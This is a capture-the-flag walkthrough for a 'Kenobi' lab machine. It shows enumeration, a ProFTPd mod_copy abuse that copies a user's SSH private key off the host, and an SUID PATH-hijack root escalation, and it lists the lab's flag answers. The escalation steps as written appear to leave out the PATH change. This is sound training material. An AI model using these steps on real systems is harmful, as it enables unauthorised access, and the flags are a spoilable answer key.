# Kenobi

ip : `10.10.211.141`

## Deploy the vulneravle machine 

nmap scanning 
```
sudo nmap -sC -sV 10.10.211.141 -oN service-scan.txt
```
| Questions | Answers |
|-----------|---------|
| Scan the machine with nmap, how many ports are open? | 7 |

## Enumerating Samba for shares


enumerate smb shares and users
```
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.211.141
```

enumerate NFS(Network File System) 
```
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.211.141
```
| Questions | Answers |
|-----------|---------|
| Using the nmap command above, how many shares have been found ? | 3 |
| Once you're connected, list the files on the share. What is the file can you see? | log.txt |
| What port is the FTP running on ? | 21 |
| What mount can we see ? | /var |

## Gain initial access with ProFtpd

searching for exploit
```
searchsploit ProFTPd 1.3.5
```
copying the ssh key file through netcat
```
nc 10.10.211.141 21
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```

mounting the NFS
```
sudo mount 10.10.211.141:/var /mnt/KenobiNFS
```

connecting ssh through the private key
```
chmod 600 id_rsa
ssh -i id_rsa kenobi@10.10.211.141
```
| Questions | Answers |
|-----------|---------|
| What is the version ? | 1.3.5 |
| How many exploits are there for the ProFTPd running ? | 4 |
| What is Kenobi's User flag (/home/kenobi/user.txt) ? | d0b0f3f53b6caa532a83915e19224899 |

## Privilege Escalation wiht Path Variable Manipulation

find binaries with suid set bit 
```
find /usr -user root -perm /4000
```
excalate root
```
cd /tmp
echo "/bin/sh" > ifconfig
chmod +x ifconfig
menu
```
after that just give 3 as a choice and boom ! 


| Questions | Answers |
|-----------|---------|
| What file looks particularly out of the ordinary ? | /usr/bin/menu |
| Run the binary, how many options appear? | 3 |
| What is the root flag? (/root/root.txt) ? | 177b3cd8562289f37382721c28381f02 |
